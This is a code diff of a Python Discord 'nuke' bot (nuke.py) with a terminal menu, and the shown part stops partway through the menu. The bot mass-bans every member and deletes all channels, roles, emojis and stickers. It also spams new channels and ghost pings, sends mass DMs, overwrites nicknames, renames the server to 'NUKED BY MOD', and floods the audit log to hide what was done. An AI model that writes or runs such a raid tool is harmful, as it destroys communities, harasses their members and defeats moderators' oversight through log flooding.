@@ -1,3 +1,4 @@
+cat << 'EOF' > nuke.py
 import discord
 from discord.ext import commands
 import asyncio
@@ -9,24 +10,15 @@ intents.members = True
 bot = commands.Bot(command_prefix="!", intents=intents)
 target_guild_id = None
 
-# Terminal Layout Color codes
-R = "\033[1;31m"
-G = "\033[1;32m"
-Y = "\033[1;33m"
-B = "\033[1;34m"
-C = "\033[1;36m"
-W = "\033[1;37m"
-RESET = "\033[0m"
+R, G, Y, B, C, W, RESET = "\033[1;31m", "\033[1;32m", "\033[1;33m", "\033[1;34m", "\033[1;36m", "\033[1;37m", "\033[0m"
 
-ban_semaphore = asyncio.Semaphore(50)     
-channel_semaphore = asyncio.Semaphore(10)  
+ban_semaphore = asyncio.Semaphore(50)
+channel_semaphore = asyncio.Semaphore(10)
 
 @bot.event
 async def on_ready():
     print(f"\n{G}[+] Logged in as {bot.user.name} | 14-in-1 Engine Activated!{RESET}")
     bot.loop.create_task(termux_panel())
-
-# ==================== WORKERS SYSTEM ====================
 
 async def fast_ban_worker(guild, member):
     async with ban_semaphore:
@@ -96,52 +88,50 @@ async def unban_worker(guild, user):
         try: await guild.unban(user)
         except: pass
 
-# ==================== BACKGROUND WRAPPERS ====================
-
 async def start_mass_ban(guild):
     if not guild.chunked: await guild.chunk()
     tasks = [fast_ban_worker(guild, m) for m in guild.members]
     await asyncio.gather(*tasks)
-    print(f"\n{G}[+] [BG_DONE] Turbo Mass Ban operation complete!{RESET}")
+    print(f"\n{G}[+] Turbo Mass Ban operation complete!{RESET}")
     display_menu()
 
 async def start_channel_delete(guild):
     tasks = [fast_channel_delete_worker(c) for c in guild.channels]
     await asyncio.gather(*tasks)
-    print(f"\n{G}[+] [BG_DONE] All channels vaporized successfully!{RESET}")
+    print(f"\n{G}[+] All channels vaporized successfully!{RESET}")
     display_menu()
 
 async def start_channel_create_spam(guild, c_name, c_msg, channel_count, spam_count, use_webhook=False):
     tasks = [fast_channel_worker(guild, c_name, c_msg, spam_count, i, use_webhook) for i in range(channel_count)]
     await asyncio.gather(*tasks)
-    print(f"\n{G}[+] [BG_DONE] Channel Creation & Spam burst ended!{RESET}")
+    print(f"\n{G}[+] Channel Creation & Spam burst ended!{RESET}")
     display_menu()
 
 async def start_ghost_ping_storm(guild, c_name, channel_count, ping_count):
     tasks = [ghost_ping_worker(guild, c_name, ping_count, i) for i in range(channel_count)]
     await asyncio.gather(*tasks)
-    print(f"\n{G}[+] [BG_DONE] Ghost Ping Storm execution completed!{RESET}")
+    print(f"\n{G}[+] Ghost Ping Storm execution completed!{RESET}")
     display_menu()
 
 async def start_audit_flood(guild, flood_intensity):
-    print(f"\n{Y}[*] [BG_START] Launching Audit Log Trash Flood (Intensity: {flood_intensity})...{RESET}")
+    print(f"\n{Y}[*] Launching Audit Log Trash Flood (Intensity: {flood_intensity})...{RESET}")
     tasks = [audit_flood_worker(guild, i) for i in range(flood_intensity)]
     await asyncio.gather(*tasks)
-    print(f"\n{G}[+] [BG_DONE] Audit Log successfully jammed and logs trashed!{RESET}")
+    print(f"\n{G}[+] Audit Log successfully jammed and logs trashed!{RESET}")
     display_menu()
 
 async def start_nickname_override(guild, nick_name):
     if not guild.chunked: await guild.chunk()
     tasks = [fast_nick_worker(m, nick_name) for m in guild.members]
     await asyncio.gather(*tasks)
-    print(f"\n{G}[+] [BG_DONE] Mass Nickname modified for all users!{RESET}")
+    print(f"\n{G}[+] Mass Nickname modified for all users!{RESET}")
     display_menu()
 
 async def start_dm_blast(guild, dm_msg):
     if not guild.chunked: await guild.chunk()
     tasks = [fast_dm_worker(m, dm_msg) for m in guild.members]
     await asyncio.gather(*tasks)
-    print(f"\n{G}[+] [BG_DONE] Mass DM distribution queue empty!{RESET}")
+    print(f"\n{G}[+] Mass DM distribution queue empty!{RESET}")
     display_menu()
 
 async def start_mass_unban(guild):
@@ -149,7 +139,7 @@ async def start_mass_unban(guild):
         bans = [entry async for entry in guild.bans()]
         tasks = [unban_worker(guild, ban_entry.user) for ban_entry in bans]
         await asyncio.gather(*tasks)
-        print(f"\n{G}[+] [BG_DONE] Mass Unban operations finished!{RESET}")
+        print(f"\n{G}[+] Mass Unban operations finished!{RESET}")
     except: pass
     display_menu()
 
@@ -160,14 +150,12 @@ async def start_asset_vaporize(guild):
     for sticker in guild.stickers:
         try: await sticker.delete()
         except: pass
-    print(f"\n{G}[+] [BG_DONE] Emojis and Stickers completely wiped!{RESET}")
+    print(f"\n{G}[+] Emojis and Stickers completely wiped!{RESET}")
     display_menu()
-
-# ==================== VISUAL INTERFACE ====================
 
 def display_menu():
     print("\n" + f"{B}="*55 + f"{RESET}")
-    print(f"{R}" + r"      __  __  ____  _____    _   _ _    _ _  _______ _   _  _____  ")
+    print(f"{R}      __  __  ____  _____    _   _ _    _ _  _______ _   _  _____  ")
     print(r"     |  \/  |/ __ \|  __ \  | \ | | |  | | |/ /_   _| \ | |/ ____| ")
     print(r"     | \  / | |  | | |  | | |  \| | |  | | ' /  | | |  \| | |  __  ")
     print(r"     | |\/| | |  | | |  | | | . ` | |  | |  <   | | | . ` | | |_ | ")
@@ -211,12 +199,13 @@ async def termux_panel():
             bot.loop.create_task(start_channel_delete(guild))
             print(f"{G}[+] Channel vaporization running in background!{RESET}")
         elif choice == "3":
-            async def del_rl(r):
-                try: await r.delete()
+            async def del_rl(role):
+                try: await role.delete()
                 except: pass
-            tasks = [del_rl(role) for role in guild.roles if role != guild.default_role and role < guild.me.top_role]
+            tasks = [del_rl(r) for r in guild.roles if r != guild.default_role and r < guild.me.top_role]
             bot.loop.create_task(asyncio.gather(*tasks))
             print(f"{G}[+] Role destruction running in background!{RESET}")
+            display_menu()
         elif choice == "4":
             c_name = (await aioconsole.ainput(f"{W}Enter Channel Name: {RESET}")).strip()
             c_msg = (await aioconsole.ainput(f"{W}Enter Spam Message: {RESET}")).strip()
@@ -231,4 +220,8 @@ async def termux_panel():
             bot.loop.create_task(start_nickname_override(guild, n_name))
             print(f"{G}[+] Nickname modification active!{RESET}")
         elif choice == "6":
-      
+            try: await guild.edit(name="NUKED BY MOD", icon=None, banner=None, splash=None, verification_level=discord.VerificationLevel.none)
+            except: pass
+            print(f"{G}[+] Server Identity smashed!{RESET}")
+            display_menu()
+        elif choice == "7":
